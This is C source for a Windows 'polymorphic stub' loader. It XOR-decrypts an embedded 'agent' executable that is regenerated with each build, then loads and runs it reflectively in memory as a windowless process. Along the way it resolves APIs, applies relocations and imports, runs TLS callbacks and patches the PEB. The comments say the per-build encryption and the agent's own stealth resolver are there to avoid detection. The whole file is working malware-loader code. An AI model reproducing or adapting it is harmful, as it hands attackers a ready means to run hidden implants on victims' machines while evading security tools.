/*
 * stub_loader.c — Polymorphic stub: decrypts and reflectively loads the agent PE.
 *
 * This file is compiled as a standalone .exe. The encrypted agent bytes and
 * XOR key are #included from a generated header (stub_payload.h) that the
 * build script creates fresh for every build.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -Os -s -I. stub_loader.c -o agent.exe \
 *       -lkernel32 -static-libgcc -Wl,--subsystem,windows -Wl,--gc-sections
 */

#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include <stdlib.h>

/* ─── Generated per-build: encrypted payload + key ─── */
#include "stub_payload.h"

/* ─── Diagnostic logging (CRT-based, always works) ─── */
#ifdef STUB_DEBUG
static FILE *_log_fp = NULL;

static void _log_open(void) {
    char path[MAX_PATH];
    const char *temp = getenv("TEMP");
    if (!temp) temp = "C:\\Windows\\Temp";
    _snprintf(path, sizeof(path), "%s\\stub_debug.log", temp);
    _log_fp = fopen(path, "a");
    if (_log_fp) {
        fprintf(_log_fp, "=== stub start ===\n");
        fflush(_log_fp);
    }
}

static void _log_msg(const char *msg) {
    if (!_log_fp) return;
    fprintf(_log_fp, "%s\n", msg);
    fflush(_log_fp);
}

static void _log_ptr(const char *label, const void *p) {
    if (!_log_fp) return;
    fprintf(_log_fp, "%s: %p\n", label, p);
    fflush(_log_fp);
}

static void _log_close(void) {
    if (_log_fp) { fprintf(_log_fp, "=== stub end ===\n"); fclose(_log_fp); _log_fp = NULL; }
}

#define SLOG(msg) _log_msg(msg)
#define SPTR(label, p) _log_ptr(label, p)
#else
#define SLOG(msg) ((void)0)
#define SPTR(label, p) ((void)0)
#define _log_open() ((void)0)
#define _log_close() ((void)0)
#endif

/* ─── API typedefs ─── */

typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *fnVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fnVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fnVirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef BOOL    (WINAPI *fnFlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE  (WINAPI *fnGetCurrentProcess_t)(void);

#if defined(_M_X64) || defined(__x86_64__)
typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PRUNTIME_FUNCTION, DWORD, DWORD64);
#endif

typedef struct {
    fnLoadLibraryA_t         pLoadLibraryA;
    fnGetProcAddress_t       pGetProcAddress;
    fnVirtualAlloc_t         pVirtualAlloc;
    fnVirtualProtect_t       pVirtualProtect;
    fnVirtualFree_t          pVirtualFree;
    fnFlushInstructionCache_t pFlushInstructionCache;
    fnGetCurrentProcess_t    pGetCurrentProcess;
#if defined(_M_X64) || defined(__x86_64__)
    fnRtlAddFunctionTable_t  pRtlAddFunctionTable;
#endif
} RESOLVED_APIS;


/* ─── API Resolution: direct IAT approach (reliable) ─── */
/*
 * The stub links with -lkernel32, so GetModuleHandleA and GetProcAddress
 * are available via IAT. We use them to resolve the rest.
 * The AGENT inside has its own PEB-walk resolver — stealth is there.
 */

static BOOL _resolve_apis(RESOLVED_APIS *api) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (!k32) {
        SLOG("[stub] FATAL: GetModuleHandleA(kernel32) returned NULL");
        return FALSE;
    }
    SPTR("[stub] kernel32 base", (void *)k32);

    api->pLoadLibraryA       = (fnLoadLibraryA_t)      GetProcAddress(k32, "LoadLibraryA");
    api->pGetProcAddress     = (fnGetProcAddress_t)     GetProcAddress(k32, "GetProcAddress");
    api->pVirtualAlloc       = (fnVirtualAlloc_t)       GetProcAddress(k32, "VirtualAlloc");
    api->pVirtualProtect     = (fnVirtualProtect_t)     GetProcAddress(k32, "VirtualProtect");
    api->pVirtualFree        = (fnVirtualFree_t)        GetProcAddress(k32, "VirtualFree");
    api->pFlushInstructionCache = (fnFlushInstructionCache_t)GetProcAddress(k32, "FlushInstructionCache");
    api->pGetCurrentProcess  = (fnGetCurrentProcess_t)  GetProcAddress(k32, "GetCurrentProcess");

    SLOG("[stub] core APIs resolved");

#if defined(_M_X64) || defined(__x86_64__)
    api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)GetProcAddress(k32, "RtlAddFunctionTable");
    if (!api->pRtlAddFunctionTable) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll)
            api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)GetProcAddress(ntdll, "RtlAddFunctionTable");
    }
    SLOG(api->pRtlAddFunctionTable ? "[stub] RtlAddFunctionTable OK" : "[stub] RtlAddFunctionTable MISSING");
#endif

    BOOL ok = (api->pLoadLibraryA && api->pGetProcAddress &&
               api->pVirtualAlloc && api->pVirtualProtect);
    SLOG(ok ? "[stub] API resolve OK" : "[stub] API resolve FAILED");
    return ok;
}


/* ─── Reflective PE Loader ─── */

typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);

/* Process base relocations */
static BOOL _process_relocs(BYTE *base, IMAGE_NT_HEADERS *nt, LONGLONG delta) {
    IMAGE_DATA_DIRECTORY *relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!relocDir->VirtualAddress || !relocDir->Size)
        return TRUE;

    IMAGE_BASE_RELOCATION *reloc = (IMAGE_BASE_RELOCATION *)(base + relocDir->VirtualAddress);
    IMAGE_BASE_RELOCATION *end   = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + relocDir->Size);

    while (reloc < end && reloc->SizeOfBlock > 0) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *entries = (WORD *)((BYTE *)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < count; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;
            BYTE *patch = base + reloc->VirtualAddress + offset;

            switch (type) {
                case IMAGE_REL_BASED_DIR64:
                    *(ULONGLONG *)patch += (ULONGLONG)delta;
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *(DWORD *)patch += (DWORD)delta;
                    break;
                case IMAGE_REL_BASED_HIGH:
                    *(WORD *)patch += (WORD)(delta >> 16);
                    break;
                case IMAGE_REL_BASED_LOW:
                    *(WORD *)patch += (WORD)delta;
                    break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;
                default:
                    return FALSE;
            }
        }
        reloc = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + reloc->SizeOfBlock);
    }
    return TRUE;
}

/* Resolve import table */
static BOOL _process_imports(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_DATA_DIRECTORY *impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!impDir->VirtualAddress || !impDir->Size)
        return TRUE;

    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base + impDir->VirtualAddress);

    while (imp->Name) {
        const char *dllName = (const char *)(base + imp->Name);
        SLOG(dllName);
        HMODULE hMod = api->pLoadLibraryA(dllName);
        if (!hMod) {
            SLOG("[stub] FAIL: LoadLibraryA returned NULL for above DLL");
            return FALSE;
        }

        IMAGE_THUNK_DATA *origThunk = (IMAGE_THUNK_DATA *)(base +
            (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
        IMAGE_THUNK_DATA *iatThunk  = (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);

        while (origThunk->u1.AddressOfData) {
            FARPROC func;
            if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                func = api->pGetProcAddress(hMod,
                    (LPCSTR)IMAGE_ORDINAL(origThunk->u1.Ordinal));
            } else {
                IMAGE_IMPORT_BY_NAME *ibn = (IMAGE_IMPORT_BY_NAME *)(base +
                    origThunk->u1.AddressOfData);
                func = api->pGetProcAddress(hMod, ibn->Name);
            }
            if (!func) {
                SLOG("[stub] FAIL: GetProcAddress returned NULL");
                return FALSE;
            }

            iatThunk->u1.Function = (ULONGLONG)func;
            origThunk++;
            iatThunk++;
        }
        imp++;
    }
    return TRUE;
}

/* Set per-section memory protections */
static void _protect_sections(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        DWORD protect = PAGE_NOACCESS;
        DWORD chars = sec->Characteristics;
        BOOL exec  = !!(chars & IMAGE_SCN_MEM_EXECUTE);
        BOOL read  = !!(chars & IMAGE_SCN_MEM_READ);
        BOOL write = !!(chars & IMAGE_SCN_MEM_WRITE);

        if (exec && write)       protect = PAGE_EXECUTE_READWRITE;
        else if (exec && read)   protect = PAGE_EXECUTE_READ;
        else if (exec)           protect = PAGE_EXECUTE;
        else if (read && write)  protect = PAGE_READWRITE;
        else if (read)           protect = PAGE_READONLY;
        else if (write)          protect = PAGE_READWRITE;

        DWORD old;
        SIZE_T secSize = sec->SizeOfRawData ? sec->SizeOfRawData : sec->Misc.VirtualSize;
        if (secSize > 0)
            api->pVirtualProtect(base + sec->VirtualAddress, secSize, protect, &old);
    }
}

/* Process TLS callbacks */
static void _process_tls(BYTE *base, IMAGE_NT_HEADERS *nt) {
    IMAGE_DATA_DIRECTORY *tlsDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!tlsDir->VirtualAddress || !tlsDir->Size)
        return;

    IMAGE_TLS_DIRECTORY *tls = (IMAGE_TLS_DIRECTORY *)(base + tlsDir->VirtualAddress);
    if (!tls->AddressOfCallBacks)
        return;

    PIMAGE_TLS_CALLBACK *callbacks = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
    while (*callbacks) {
        (*callbacks)((PVOID)base, DLL_PROCESS_ATTACH, NULL);
        callbacks++;
    }
}

/* Main PE loader */
static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
    SLOG("[stub] load_pe_and_run enter");

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)rawPE;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { SLOG("[stub] FAIL: bad MZ"); return FALSE; }

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(rawPE + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { SLOG("[stub] FAIL: bad PE sig"); return FALSE; }

    SLOG("[stub] PE headers validated");

    /* Allocate at preferred base, fall back to any address */
    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    BYTE *base = (BYTE *)api->pVirtualAlloc(
        (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
        imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    LONGLONG delta = 0;
    if (!base) {
        base = (BYTE *)api->pVirtualAlloc(
            NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        );
        if (!base) { SLOG("[stub] FAIL: VirtualAlloc"); return FALSE; }
        SLOG("[stub] allocated at fallback address");
    } else {
        SLOG("[stub] allocated at preferred base");
    }
    delta = (LONGLONG)((ULONGLONG)base - nt->OptionalHeader.ImageBase);
    SPTR("[stub] base", base);

    /* Copy PE headers */
    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        base[i] = rawPE[i];

    /* Map sections */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData == 0) continue;
        BYTE *dst = base + sec->VirtualAddress;
        BYTE *src = rawPE + sec->PointerToRawData;
        for (DWORD j = 0; j < sec->SizeOfRawData; j++)
            dst[j] = src[j];
    }
    SLOG("[stub] sections mapped");

    /* Re-read NT headers from the mapped copy */
    IMAGE_NT_HEADERS *mappedNt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    /* Process relocations */
    if (delta != 0) {
        if (!_process_relocs(base, mappedNt, delta)) { SLOG("[stub] FAIL: relocs"); return FALSE; }
        SLOG("[stub] relocations applied");
    } else {
        SLOG("[stub] no relocs needed");
    }

    /* Resolve imports */
    SLOG("[stub] resolving imports...");
    if (!_process_imports(base, mappedNt, api)) { SLOG("[stub] FAIL: imports"); return FALSE; }
    SLOG("[stub] imports resolved");

    /* Flush icache */
    if (api->pFlushInstructionCache && api->pGetCurrentProcess)
        api->pFlushInstructionCache(api->pGetCurrentProcess(), NULL, 0);

    /* Register exception handlers (x64) */
#if defined(_M_X64) || defined(__x86_64__)
    {
        IMAGE_DATA_DIRECTORY *excDir = &mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size && api->pRtlAddFunctionTable) {
            PRUNTIME_FUNCTION pFunc = (PRUNTIME_FUNCTION)(base + excDir->VirtualAddress);
            DWORD numEntries = excDir->Size / sizeof(RUNTIME_FUNCTION);
            api->pRtlAddFunctionTable(pFunc, numEntries, (DWORD64)base);
            SLOG("[stub] exception handlers registered");
        } else {
            SLOG("[stub] WARNING: no .pdata or RtlAddFunctionTable missing");
        }
    }
#endif

    /* Set section protections */
    _protect_sections(base, mappedNt, api);
    SLOG("[stub] protections set");

    /* TLS */
    _process_tls(base, mappedNt);
    SLOG("[stub] TLS done");

    /* Patch PEB.ImageBaseAddress so GetModuleHandle(NULL) returns the loaded PE */
    {
        void *peb;
#if defined(_M_X64) || defined(__x86_64__)
        __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
        *(void **)((BYTE *)peb + 0x10) = base;
#else
        __asm__ volatile("mov %%fs:0x30, %0" : "=r"(peb));
        *(void **)((BYTE *)peb + 0x08) = base;
#endif
    }
    SLOG("[stub] PEB patched");

    /* Call entry point */
    DWORD entryRVA = mappedNt->OptionalHeader.AddressOfEntryPoint;
    if (!entryRVA) { SLOG("[stub] FAIL: no entry point RVA"); return FALSE; }

    void *entry = base + entryRVA;
    SPTR("[stub] entry point", entry);
    SLOG("[stub] calling entry point...");

    /* Close log before transferring control — agent may run indefinitely */
    _log_close();

    if (mappedNt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
        DllMain_t dllMain = (DllMain_t)entry;
        dllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    } else {
        typedef void (*EntryPoint_t)(void);
        EntryPoint_t ep = (EntryPoint_t)entry;
        ep();
    }

    return TRUE;
}


/* ─── Entry Point ─── */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    _log_open();
    SLOG("[stub] WinMain entered");

    /* Phase 1: Resolve APIs */
    RESOLVED_APIS api;
    if (!_resolve_apis(&api)) {
        SLOG("[stub] FATAL: _resolve_apis failed");
        _log_close();
        return 1;
    }

    /* Phase 2: Decrypt payload in-place */
    SLOG("[stub] decrypting payload...");
    for (DWORD i = 0; i < PAYLOAD_SIZE; i++)
        g_enc_payload[i] ^= g_xor_key[i % KEY_SIZE];

    if (g_enc_payload[0] != 'M' || g_enc_payload[1] != 'Z') {
        SLOG("[stub] FATAL: decrypted data is not MZ");
        _log_close();
        return 1;
    }
    SLOG("[stub] decryption OK, MZ valid");

    /* Phase 3: Reflectively load and execute */
    if (!load_pe_and_run(g_enc_payload, PAYLOAD_SIZE, &api)) {
        SLOG("[stub] FATAL: load_pe_and_run failed");
        _log_close();
        return 1;
    }

    _log_close();
    return 0;
}
